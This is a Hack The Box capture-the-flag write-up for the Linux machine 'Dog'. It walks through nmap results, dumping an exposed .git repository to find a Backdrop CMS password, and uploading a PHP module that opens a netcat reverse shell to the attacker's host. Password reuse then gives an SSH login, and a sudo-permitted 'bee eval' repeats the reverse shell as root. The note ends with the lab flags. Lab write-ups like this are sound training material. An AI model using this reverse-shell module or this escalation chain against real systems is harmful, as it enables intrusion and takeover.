```json
Alias: Dog
Date: 11-03_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.58
```

 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 02:37 PKT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.00% done; ETC: 02:37 (0:00:00 remaining)
Nmap scan report for 10.10.11.58
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.44 seconds

```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

The website has a `.git` file indicating that a git repository is set up, we can try to exfiltrate the files taking advantage of this using `git_dumper`. 

```sh
./git_dumper.py http://10.10.11.58/ ~/Documents/CTF/Hackthebox/Labs/Dog/git
```

The `settings.php` contains a connection string with the password: `BackDropJ2024DS2024`

We have a potential password but no username, so let's try to enumerate users on the backdrop CMS running on port 80. This script can help: https://github.com/FisMatHack/BackDropScan/blob/main/BackDropScan.py.

Trying some usernames, we find Tiffany is a valid user.

| Username | Password            |
| -------- | ------------------- |
| tiffany  | BackDropJ2024DS2024 |

---

# Exploitation

Now that we have access to the backdoor CMS, we can install a new module to gain code execution. To do this I cloned the module template from here: https://github.com/backdrop-contrib/module_template, changed `mymodue.module` to:

```php
<?php
/**
 * @file
 * MyModule - A simple Backdrop CMS module.
 */

/**
 * Implements hook_menu().
 */
function mymodule_menu() {
  return array(
    'module/my_module' => array(
      'title' => 'MyModule',
      'description' => 'Configure MyModule.',
      'page callback' => 'mymodule_settings_page',
      'access arguments' => array('administer mymodule'),
    ),
  );
}

/**
 * Page callback for MyModule settings.
 */
function mymodule_settings_page() {
  shell_exec("busybox nc 10.10.14.245 4444 -e sh");
  return array(
    '#markup' => '<p>Welcome to MyModule settings page.</p>',
  );
}

/**
 * Implements hook_permission().
 */
function mymodule_permission() {
  return array(
    'administer mymodule' => array(
      'title' => t('Administer MyModule'),
    ),
  );
}


```

tar the module:

```bash
tar -czvf my_module.tar.gz my_module
```

Install the module from the manual install functionality, then enable it. After which start up your listener and visit `/?q=module/my_module` to get the connection.

---

# Lateral Movement

Now that we have a shell as `www-data`, looking at `/home` there are two users, and we have a case of password re-use. We can SSH to `johncusack` using the same backdrop password.

| User       | Password            |
| ---------- | ------------------- |
| johncusack | BackDropJ2024DS2024 |

---

# Privilege Escalation

Doing `sudo -l`, we see john can run `/usr/local/bin/bee` as root. This is a `symlink` to `/backdoor_tools/bee.php`. Bee is a command line management tool for Backdrop, we can quickly find an interesting option if we type bee in the terminal.

![[Pasted image 20250324040419.png]]

To have this run properly, we need to navigate to the backdrop root. `/var/www/html`. After which run the command (Change IP and port):

```bash
sudo /usr/local/bin/bee eval 'shell_exec("busybox nc 10.10.14.245 4444 -e sh")
```

to get a shell as root.

---

# Flags
- da33ad8ebfa49efa8fbe4e661f24a569
- 1e20d5077c4869c97dfbb0de9c577730

#CTF